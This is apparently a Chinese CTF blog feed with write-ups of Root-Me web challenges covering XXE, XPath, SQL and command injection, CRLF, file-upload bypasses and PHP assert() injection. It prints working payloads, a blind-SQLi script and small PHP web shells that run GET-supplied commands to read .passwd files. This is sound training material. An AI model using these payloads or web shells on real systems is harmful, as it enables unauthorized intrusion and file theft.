Entity</h2><p>XXE（外部实体注入），题目可以远程引入rss文件，而rss文件是符合xml规范的，这题我们需要注意的是我们引入的xml文件必须要符合rss标准，否则会解析错误，在自己的vps上写入文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file1 SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">xmlns:slash</span>=<span class="string">"http://purl.org/rss/1.0/modules/slash/"</span> <span class="attr">version</span>=<span class="string">"2.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;file1;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在RSS Validity Checker页面提交 <code>http://your_vps_ip/exp.xml</code> ，然后就可以收到PHP文件内容了。</p><h2 id="XPath-injection-authentication"><a href="#XPath-injection-authentication" class="headerlink" title="XPath injection - authentication"></a>XPath injection - authentication</h2><p>Xpath注入，Xpath是用于在XML中选取相应数据的语言，XML相当于数据库的话，xpath相当于sql查询语言，可以查看这篇文章 <a href="https://blog.csdn.net/quiet_girl/article/details/50588130" target="_blank" rel="noopener">https://blog.csdn.net/quiet_girl/article/details/50588130</a>，当我使用了它提供的这种基本思路 <code>username=John&amp;password=&#39; or &#39;&#39;=&#39;&#39; or &#39;&#39;=&#39;</code> 可以登录，但是由于匹配到了所有的用户，但是题目值只回显第一个普通用户，这无法使我们以administrator身份登录，所以我们需要尝试其他的思路， 我们有members页面知道administrator权限的用户名为John，那么我们可以尝试将password验证闭合掉只验证用户名，那我们不就可以登录任意用户名了，我们构造一下即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=John&apos; and (&apos;&apos;=&apos;&apos; or &apos;&apos;=&apos;&amp;password=&apos;) and &apos;&apos;=&apos;</span><br></pre></td></tr></table></figure><p>题目后端执行的语句可能是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/text()=&apos;xyz&apos;and password/text()=&apos;123test&apos;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/text()=&apos;John&apos; and (&apos;&apos;=&apos;&apos; or &apos;&apos;=&apos;&apos; and password/text()=&apos;&apos;) and &apos;&apos;=&apos;&apos;]</span><br></pre></td></tr></table></figure><p>我们可以看到password验证被成功闭合为字符串了比较了。</p><h2 id="SQL-injection-Error"><a href="#SQL-injection-Error" class="headerlink" title="SQL injection - Error"></a>SQL injection - Error</h2><p>上sqlmap即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;order=asc&quot; -p order --threads=10 --dbs</span><br></pre></td></tr></table></figure><p>是一个postgresql数据库的相关注入</p><h2 id="SQL-injection-blind"><a href="#SQL-injection-blind" class="headerlink" title="SQL injection - blind"></a>SQL injection - blind</h2><p>本题是SQL盲注，很常规，所以直接给脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenge01.root-me.org/web-serveur/ch10/"</span></span><br><span class="line">chars = <span class="string">"qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM@%&amp;?"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> chars:</span><br><span class="line">content = requests.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"admin' and password glob '&#123;&#125;*'--+"</span>.format(flag + item), <span class="string">'password'</span>:<span class="string">"123"</span>&#125;).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"master"</span> <span class="keyword">in</span> content:</span><br><span class="line">flag += item</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="SQL-injection-file-reading"><a href="#SQL-injection-file-reading" class="headerlink" title="SQL injection - file reading"></a>SQL injection - file reading</h2><p>在members界面的id参数存在数字型注入， 可以得到数据库信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://challenge01.root-me.org/web-serveur/ch31/?action=members&amp;id=1"</span> -p id --threads=10 -D c_webserveur_31 --dump-all</span><br></pre></td></tr></table></figure><p><img src="/2018/08/06/rootme1/10.png" alt="content"></p><p>但是这个密码没有用，题目说了需要文件读取，故尝试读取index.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch31/?action=members&amp;id=-1 union select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4-- +</span><br></pre></td></tr></table></figure><blockquote><p>16进制值的含义为<em>/challenge/web-serveur/ch31/index.php</em></p></blockquote><p>之后可以看到密码的相关的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($pass == stringxor($key, base64_decode($data[<span class="string">'member_password'</span>])))&#123;</span><br><span class="line">                                <span class="comment">// authentication success</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">"&lt;p&gt;Authentication success !!&lt;/p&gt;"</span>;</span><br><span class="line">                                <span class="keyword">if</span> ($user == <span class="string">"admin"</span>)</span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Yeah !!! You're admin ! Use this password to complete this challenge.&lt;/p&gt;"</span>;</span><br><span class="line">                                <span class="keyword">else</span> </span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">"&lt;p&gt;But... you're not admin !&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$key,stringxor在前面的代码中都有，所以我们按照它的逻辑求解一下即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringxor</span><span class="params">($o1, $o2)</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($o1);$i++)</span><br><span class="line">        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        </span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="string">"c92fcd618967933ac463feb85ba00d5a7ae52842"</span>;</span><br><span class="line">$a = stringxor($key, base64_decode(<span class="string">'VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=='</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可得到前文的$pass的值为 <code>77be4fc97f77f5f48308942bb6e32aacabed9cef</code> ，但是$pass的值也是经过处理的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass = sha1($_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><p>找一个可以解sha1密码的网站在线解密一下即可，最后明文密码为 <code>superpassword</code> 。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;接上篇writeup&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>rootme.webserver1</title>
    <link href="http://chaosec.top/2018/07/31/rootme/"/>
    <id>http://chaosec.top/2018/07/31/rootme/</id>
    <published>2018-07-31T09:45:39.000Z</published>
    <updated>2019-01-30T11:50:04.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。</p><a id="more"></a><h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web-Server"></a>Web-Server</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>签到题，查看元素即可。</p><h2 id="HTTP-Open-redirect"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP-Open redirect"></a>HTTP-Open redirect</h2><p>查看提示可知，题目要求我们能够重定向网页到另一个网址，可以尝试抓包看一下，发现发起的请求如下</p><blockquote><p>GET /web-serveur/ch52/?url=<a href="https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134" target="_blank" rel="noopener">https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134</a> HTTP/1.1</p></blockquote><p>那么我们可以尝试修改url实现重定向，但是不对，猜测h字段应该也要相应变化，感觉这个h字段像是一段hash值，测试了一下发现前面url的值的MD5<br>的值正好是后面h字段的值，于是此题就解出来了，payload如下(用bp发送比较好)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://qq.com&amp;h=fb992d62fc0302ccc9da03fe80fb1d42</span><br></pre></td></tr></table></figure><h2 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h2><p>题目其实不难，我想复杂了，想着要反弹shell，结果没成功，还是我对命令注入理解太少了，没什么很难的点，直接上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;more index.php</span><br></pre></td></tr></table></figure><p>也可以用cat命令，然后查看元素即可</p><h2 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h2><p>弱口令，用户名和密码均为admin</p><h2 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h2><p>看标题应该和user-agent字段有关，访问题目可得</p><blockquote><p>Wrong user-agent: you are not the “admin” browser!</p></blockquote><p>所以我们直接修改user-agent字段为admin然后即可hack</p><h2 id="Backup-file"><a href="#Backup-file" class="headerlink" title="Backup file"></a>Backup file</h2><p>题目存在备份文件泄露漏洞，泄露的文件为 <code>index.php~</code> ，下载之后即可得flag</p><h2 id="HTTP-POST"><a href="#HTTP-POST" class="headerlink" title="HTTP - POST"></a>HTTP - POST</h2><p>抓包绕过前端js，修改score值在发包即可</p><h2 id="HTTP-directory-indexing"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</h2><p>打开题目查看元素， <code>include(&quot;admin/pass.html&quot;)</code> ，打开题目之后却说这是逗我玩的，之后尝试访问admin，可以访问，接着依次访问 <code>backup/admin.txt</code> 即可得到flag</p><h2 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</h2><p>应该是修改请求头，抓包看一下发现有个字段 <code>Header-RootMe-Admin: none</code> ，尝试着把它的值改为true，再次发起请求即可得到flag</p><h2 id="HTTP-verb-tampering"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</h2><p>这个题没有理解题目的意思，标题的中文意思是 <strong>http动作篡改</strong> ，不知道这个题目要什么，查阅资料后才知道这个题目是要求我们改变我们发起请求的方法，猜测题目应该存在某种逻辑错误导致可以用过更换请求方式来实现绕过，本来可以用curl命令来发起请求，但是我试了没有成功，所以我写了个简单的代码实现它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://challenge01.root-me.org/web-serveur/ch8/'</span></span><br><span class="line">content = requests.put(url).content</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure><h2 id="Install-files"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</h2><p>我并没有理解这道题的意义在哪，题目提示 <code>you know phpbb</code> ，又提到install file，直接google一下 <code>phpbb install file</code> 即可得到phpbb系统的安装包位置，访问即可获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php</span><br></pre></td></tr></table></figure><h2 id="Improper-redirect"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</h2><p>直接抓包修改login.php为index.php即可</p><p><img src="/2018/07/31/rootme/1.png" alt=""></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><hr><p>首先了解一波CRLF</p><blockquote><p>CRLF是“回车+换行”（\\r\\n）的简称，在HTTP协议中，，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。</p></blockquote><p>我的理解就是该种攻击方式能够在HTTP头部注入HTML代码，从而达到html代码注入的目的</p><p><em>0X01</em></p><p>对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss</p><p>比如某个网站接受的参数为 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="noopener">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输出的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xxx/)&gt;</span><br></pre></td></tr></table></figure><p>那么返回的包就会是</p><blockquote><p>HTTP/1.1 302 Moved Temporarily<br>Date: Fri, 27 Jun 2014 17:52:17 GMT<br>Content-Type: text/html<br>Content-Length: 154<br>Connection: close<br>Location:<br>&lt;img src=1 onerror=alert(/xxx/)&gt;</p></blockquote><p>所以就实现了xxs的构造</p><p>HRS输入是无视浏览器Filter的，浏览器Filter是一些浏览器应对XSS的保护策略，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter，所以我们可以考虑通过HRS将 <code>X-XSS-Protection:0</code> 注入到HTTP头部中，在利用两个CRLF注入xss代码从而可以实现xss漏洞</p><p><a href="https://blog.csdn.net/think_ycx/article/details/50267801" target="_blank" rel="noopener">参考链接</a></p><hr><p>题目给出了提示</p><blockquote><p>Inject false data in the journalisation log.</p></blockquote><p>但是我并不知道究竟怎么样才算是一个false data，不知道这个题目用CRLF怎么来玩，看了别人的wp思路后，可以构造出payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /web-serveur/ch14/?username=guest authenticated.%0d%0aguest&amp;password=12456 HTTP/1.1</span><br></pre></td></tr></table></figure><p>刚开始我不懂为什么这样做的原因，但是我看到提交一次请求，日志中更新了两条信息</p><blockquote><p>guest authenticated.<br>guest failed to authenticate.</p></blockquote><p>是不是因为一次更新了两条信息从而满足了false data的条件呢？我尝试了其他payload，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /web-serveur/ch14/?username=admin authenticated.%0d%0Aadmin&amp;password=12456 HTTP/1.1</span><br></pre></td></tr></table></figure><p>也是可以的，但是当第一条记录是失败记录时则无法得到flag。总之这题的原理还是不很清楚。</p><h2 id="File-upload-double-extensions"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</h2><p>文件上传。题目要求读根目录下的.passwd文件，题目给出了提示 <code>double extensions（双后缀）</code> ，基本可以知道这个上传是双后缀名绕过，本地写一个PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$content = shell_exec($_GET[<span class="string">'snow'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存，修改后缀名为 <code>.php.jpg</code> 然后上传即可获得文件路径，发起如下GET请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/lngij69s7er2fa7oupcg6nold6/1.php.jpg?snow=ls ../../../ -a</span><br></pre></td></tr></table></figure><p>依次向父目录跳转，直到看到.passwd文件，读文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/lngij69s7er2fa7oupcg6nold6/1.php.jpg?snow=cat ../../../.passwd</span><br></pre></td></tr></table></figure><h2 id="File-upload-MIME-type"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</h2><p>看题目提示直接修改文件类型即可，不需要更改后缀，创建一个PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'snow'</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交，抓包修改一下</p><p><img src="/2018/07/31/rootme/2.png" alt=""></p><h2 id="HTTP-cookies"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</h2><p>考察修改cookie的基本知识，修改cookie值为admin即可</p><h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><p>可以尝试随便点一下，看到URL变化了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=devices</span><br></pre></td></tr></table></figure><p>猜测 <code>?galerie=devices</code> 中的devices应该是目录名，所以我们可以尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./</span><br></pre></td></tr></table></figure><p>看到确实多出来一个区块</p><p><img src="/2018/07/31/rootme/3.png" alt=""></p><p>无法直接点击，查看元素</p><p><img src="/2018/07/31/rootme/4.png" alt=""></p><p>按照路径访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.//86hwnX2r</span><br></pre></td></tr></table></figure><p>可以看到有password区块，查看元素可以看到路径</p><p><img src="/2018/07/31/rootme/5.png" alt=""></p><p>但是用get请求无法访问，要用路径名访问才可以，最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch15/galerie//86hwnX2r/password.txt</span><br></pre></td></tr></table></figure><h2 id="File-upload-null-byte"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</h2><p>考察%00截断，新建PHP文件，改后缀名为 <code>filename.php%00.jpg</code> 上传并访问即可获得flag</p><h2 id="PHP-assert"><a href="#PHP-assert" class="headerlink" title="PHP assert()"></a>PHP assert()</h2><p>这题涨姿势了，应该考察的是函数闭合的问题，先尝试随便输入一下，没什么反应，尝试输入非法内容诱使报错</p><p><img src="/2018/07/31/rootme/6.png" alt=""></p><p>可以推测报错对应代码应该是 <code>assert(strpos(&#39;includes/home.php&#39;, &#39;..&#39;) === false);</code> ，那么我们是否可以尝试向SQL注入一样闭合括号呢？由报错信息可以看到我们可控的输入内容是 <code>home</code> 这个位置，那么我们尝试闭合一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">','</span>..<span class="string">') === false and strpos('</span>s</span><br></pre></td></tr></table></figure><p>拼接到上述代码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(strpos(<span class="string">'includes/a'</span>,<span class="string">'..'</span>) === <span class="keyword">false</span> <span class="keyword">and</span> strpos(<span class="string">'s.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>如此代码成功闭合，那么我们只需要构造代码读取 .passwd 文件的内容即可，最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch47/?page=home&apos;,&apos;..&apos;) === false and $flag=fopen(&apos;.passwd&apos;,&apos;r&apos;) and print(fread($flag,filesize(&apos;.passwd&apos;))) and strpos(&apos;home</span><br></pre></td></tr></table></figure><h2 id="PHP-filters"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</h2><p>考察PHP://filter的应用</p><p>尝试读取文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=login.php</span><br></pre></td></tr></table></figure><p>base64解码得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">"username"</span>]==$username &amp;&amp; $_POST[<span class="string">"password"</span>]==$password)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h2&gt;Welcome back !&lt;/h2&gt;"</span>);</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"To validate the challenge use this password&lt;br/&gt;&lt;br/&gt;"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  Login&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  Password&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"connect"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再访问config.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure><p>解码即可得到flag</p><h2 id="PHP-register-globals"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</h2><p>查看提示</p><blockquote><p>It seems that the developper often leaves backup files around…</p></blockquote><p>可能存在备份文件泄露，尝试发现存在 <code>index.php.bak</code> ，访问之后下载文件，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($password, $hidden_password)</span></span>&#123;</span><br><span class="line">    $res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($password) &amp;&amp; $password!=<span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $password == $hidden_password )&#123;</span><br><span class="line">            $res=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">"logged"</span>]=$res;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($res)</span></span>&#123;</span><br><span class="line">    $aff= <span class="string">'</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Authentication v 0.05&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="" method="POST"&gt;</span></span><br><span class="line"><span class="string">      Password&amp;nbsp;&lt;br/&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">      &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="submit" value="connect" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;'</span>.htmlentities($res).<span class="string">'&lt;/h3&gt;</span></span><br><span 